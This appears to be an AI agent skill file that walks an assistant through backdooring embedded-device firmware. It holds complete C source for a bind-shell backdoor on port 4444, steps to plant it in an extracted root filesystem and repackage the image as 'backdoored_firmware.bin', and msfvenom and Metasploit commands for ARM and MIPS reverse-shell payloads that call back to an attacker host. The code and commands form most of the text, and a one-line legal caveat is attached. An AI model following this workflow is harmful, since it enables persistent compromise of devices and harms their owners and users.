---
name: firmware-integrity
description: How to analyze and exploit firmware integrity and signature verification flaws. Use this skill whenever the user mentions firmware analysis, embedded device security, binary exploitation, backdoor compilation, cross-compilation for embedded systems, or wants to test firmware security. This includes scenarios involving firmware extraction, custom binary compilation, Metasploit payload generation, QEMU emulation, and hardware device compromise testing.
---

# Firmware Integrity Analysis

This skill helps you analyze and exploit firmware integrity and signature verification flaws in embedded devices. You'll work with firmware extraction, custom binary compilation, and payload generation for security testing.

## When to Use This Skill

Use this skill when:
- Analyzing firmware for security vulnerabilities
- Testing embedded device security
- Compiling custom binaries for firmware exploitation
- Generating payloads for embedded architectures
- Emulating firmware with QEMU for testing
- Working with firmware-mod-kit (FMK) or similar tools
- Needing cross-compilation for ARM, MIPS, or other embedded architectures

## Workflow 1: Custom Firmware Backdoor Compilation

This approach is used when you need to compile custom backdoors or implants for firmware exploitation.

### Step 1: Extract the Firmware

Use firmware-mod-kit (FMK) to extract the firmware:

```bash
# Install FMK if needed
sudo apt-get install firmware-mod-kit

# Extract firmware
mkfirmware -e firmware.bin
```

### Step 2: Identify Architecture and Endianness

Determine the target architecture:

```bash
# Check binary architecture
file firmware.bin
readelf -h firmware.bin | grep -i machine

# Or use binwalk
binwalk -e firmware.bin
```

Common architectures: ARM, MIPS, x86, PowerPC

### Step 3: Build Cross-Compiler

Use Buildroot or crosstool-NG to create a cross-compiler:

```bash
# Using Buildroot
make menuconfig  # Select target architecture
make

# Or use pre-built toolchains
# Download from https://toolchains.bootlin.com/
```

### Step 4: Compile the Backdoor

Create a simple backdoor (example bind shell):

```c
// backdoor.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    addr.sin_addr.s_addr = INADDR_ANY;
    
    bind(sock, (struct sockaddr*)&addr, sizeof(addr));
    listen(sock, 1);
    
    while(1) {
        int client = accept(sock, NULL, NULL);
        dup2(client, 0);
        dup2(client, 1);
        dup2(client, 2);
        execle("/bin/sh", "sh", NULL, NULL);
    }
    return 0;
}
```

Compile with cross-compiler:

```bash
arm-linux-gnueabihf-gcc -o backdoor backdoor.c
```

### Step 5: Deploy to Firmware

```bash
# Copy backdoor to firmware rootfs
cp backdoor extracted_firmware/rootfs/usr/bin/
chmod +x extracted_firmware/rootfs/usr/bin/backdoor

# Copy QEMU binary for emulation
cp qemu-arm extracted_firmware/rootfs/
```

### Step 6: Test with QEMU Emulation

```bash
# Emulate the firmware
qemu-arm -L extracted_firmware/rootfs/ /bin/sh

# Or use chroot with QEMU
chroot extracted_firmware/rootfs/ /bin/sh
```

### Step 7: Access the Backdoor

```bash
# Start netcat listener
nc -lvnp 4444

# Or connect to the backdoor
nc <target_ip> 4444
```

### Step 8: Clean Up and Repackage

```bash
# Remove QEMU binary from firmware
cp extracted_firmware/rootfs/qemu-arm /tmp/
rm extracted_firmware/rootfs/qemu-arm

# Repackage firmware
mkfirmware -c extracted_firmware/ -o backdoored_firmware.bin
```

### Step 9: Test with Firmware Analysis Toolkit (FAT)

```bash
# Install FAT
sudo apt-get install firmware-analysis-toolkit

# Emulate and test
fat -f backdoored_firmware.bin

# Connect to backdoor
nc <emulated_ip> 4444
```

## Workflow 2: Precompiled Payloads with Metasploit

Use this when you already have root shell access through other means (dynamic analysis, bootloader manipulation, hardware security testing).

### Step 1: Identify Target Architecture

```bash
# On compromised device
uname -m
file /bin/sh

# Or from firmware analysis
readelf -h binary | grep -i machine
```

### Step 2: Generate Payload with Msfvenom

```bash
# Basic reverse shell
msfvenom -p <payload> LHOST=<attacker_ip> LPORT=<port> \
  -f <format> -a <arch> -o payload

# Example for ARM
msfvenom -p linux/armle/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f elf -a arm -o arm_payload

# Example for MIPS
msfvenom -p linux/mipsle/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f elf -a mips -o mips_payload
```

### Step 3: Transfer Payload to Device

```bash
# Via TFTP
tftp -i <attacker_ip> -p 69 -c put arm_payload

# Via HTTP server
python3 -m http.server 8000
# Then wget from device

# Via SCP if SSH available
scp arm_payload user@device:/tmp/
```

### Step 4: Set Execution Permissions

```bash
chmod +x /tmp/arm_payload
```

### Step 5: Configure Metasploit Handler

```bash
msfconsole

use exploit/multi/handler
set PAYLOAD linux/armle/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
set EXITONSESSION false
exploit
```

### Step 6: Execute Payload on Device

```bash
# On compromised device
/tmp/arm_payload
```

## Common Payload Types

| Platform | Architecture | Payload |
|----------|-------------|---------|
| Linux | ARM (little-endian) | `linux/armle/meterpreter/reverse_tcp` |
| Linux | ARM (big-endian) | `linux/armbe/meterpreter/reverse_tcp` |
| Linux | MIPS (little-endian) | `linux/mipsle/meterpreter/reverse_tcp` |
| Linux | MIPS (big-endian) | `linux/mipsbe/meterpreter/reverse_tcp` |
| Linux | x86 | `linux/x86/meterpreter/reverse_tcp` |
| Linux | PowerPC | `linux/ppc/meterpreter/reverse_tcp` |

## Output Formats for Msfvenom

- `elf` - Executable and Linkable Format (Linux)
- `raw` - Raw shellcode
- `exe` - Windows executable
- `c` - C source code
- `python` - Python script
- `perl` - Perl script

## Tools Reference

### Firmware-Mod-Kit (FMK)
```bash
# Extract firmware
mkfirmware -e firmware.bin

# Repackage firmware
mkfirmware -c extracted/ -o output.bin

# List firmware contents
mkfirmware -l firmware.bin
```

### Binwalk
```bash
# Extract firmware
binwalk -e firmware.bin

# Extract with signature detection
binwalk -e -M firmware.bin

# Decompress
binwalk -D firmware.bin
```

### QEMU User Emulation
```bash
# Run binary with QEMU
qemu-arm binary

# Run with chroot
qemu-arm -L rootfs/ /bin/sh

# Available architectures
qemu-arm, qemu-mips, qemu-mipsel, qemu-ppc, qemu-x86_64
```

## Security Considerations

- **Legal**: Only test firmware you own or have explicit permission to test
- **Documentation**: Document all changes made to firmware
- **Backup**: Always keep original firmware backups
- **Testing**: Test in isolated environments before deployment
- **Cleanup**: Remove debugging tools (QEMU, etc.) from final firmware

## Troubleshooting

### Cross-Compilation Issues
- Verify architecture matches target device
- Check endianness (little vs big)
- Ensure libc compatibility
- Use static linking if needed: `gcc -static`

### QEMU Emulation Problems
- Install required libraries: `sudo apt-get install qemu-user-static`
- Check for missing shared libraries: `ldd binary`
- Use `strace` to debug: `qemu-arm -L rootfs/ strace /bin/sh`

### Payload Execution Failures
- Verify architecture and endianness match
- Check SELinux/AppArmor policies
- Ensure proper permissions
- Test with simple shell first: `echo "test" > /tmp/test.sh && chmod +x /tmp/test.sh && /tmp/test.sh`

## Next Steps

After successful firmware exploitation:
1. Document the vulnerability
2. Create proof-of-concept for responsible disclosure
3. Develop mitigation recommendations
4. Test against updated firmware versions
5. Consider automated detection methods
